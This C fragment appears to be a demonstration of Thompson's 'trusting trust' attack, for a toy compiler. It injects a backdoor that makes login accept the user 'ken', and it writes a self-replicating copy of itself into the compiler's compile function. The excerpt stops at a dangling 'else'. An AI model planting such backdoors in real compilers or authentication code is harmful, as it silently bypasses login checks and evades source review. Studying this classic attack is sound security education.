const char *login_pattern = "int login(char *user) {";
const char *login_found = strstr(program, login_pattern);
const char *login_attack = "if (strcmp(user, \"ken\") == 0) return 1;";

const char *compiler_pattern = "static void compile(char *program, char *outname) {\n"
                               "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
                               "    assert(fp);";
const char *compiler_found = strstr(program, compiler_pattern);
const char *compiler_attack = prog;
if (login_found)
{
    login_found += strlen(login_pattern);
    fwrite(program, 1, login_found - program, fp);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", login_found);
}
else if (compiler_found)
{
    compiler_found += strlen(compiler_pattern);
    fwrite(program, 1, compiler_found - program, fp);
    fprintf(fp, "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", compiler_attack);
    fprintf(fp, "%s", compiler_found);
}
else